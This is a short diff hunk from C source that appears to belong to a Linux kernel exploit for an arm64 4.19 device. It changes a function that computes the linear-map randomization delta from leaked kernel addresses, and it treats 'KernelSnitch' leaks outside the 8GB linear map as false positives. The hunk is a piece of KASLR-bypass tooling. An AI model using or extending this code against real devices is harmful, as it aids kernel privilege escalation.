@@ -193,6 +193,27 @@ static int linear_delta_index(void) {
  * alioth's RAM gives exactly one linear-map delta.  CFI step=4 is the
  * on-device oracle for which candidate is real. */
 void select_linear_map_delta(uintptr_t mm_va) {
+  /* Offline source verification (memory.h:280): 4.19 arm64 has NO linear
+   * map randomization -- __phys_to_virt is (x - PHYS_OFFSET) | PAGE_OFFSET,
+   * so g_linear_map_delta is always 0 and any leaked mm outside
+   * [PAGE_OFFSET, PAGE_OFFSET+8GB) is a KernelSnitch false positive. */
+  uintptr_t mm_off = mm_va - P0_PAGE_OFFSET;
+  if (mm_off >= 0x200000000ULL) {
+    pr_error("KS_DELTA mm=%016zx offset=%016zx exceeds 8GB linear map: "
+             "false-positive leak, refusing delta\n", mm_va, mm_off);
+    g_linear_map_delta = 0;
+    return;
+  }
+  if (g_linear_map_delta != 0) {
+    pr_info("KS_DELTA forcing delta=0 (4.19 linear map is not randomized, "
+            "was 0x%016zx)\n", g_linear_map_delta);
+    g_linear_map_delta = 0;
+    return;
+  }
+  pr_info("KS_DELTA delta=0 confirmed (mm offset=%016zx in linear map)\n",
+          mm_off);
+  return;
+
   static const int64_t ram_start = (int64_t)P0_PHYS_OFFSET;
   static const int64_t ram_end = (int64_t)0x280000000ULL;
   static const int64_t section = (int64_t)1 << 30;
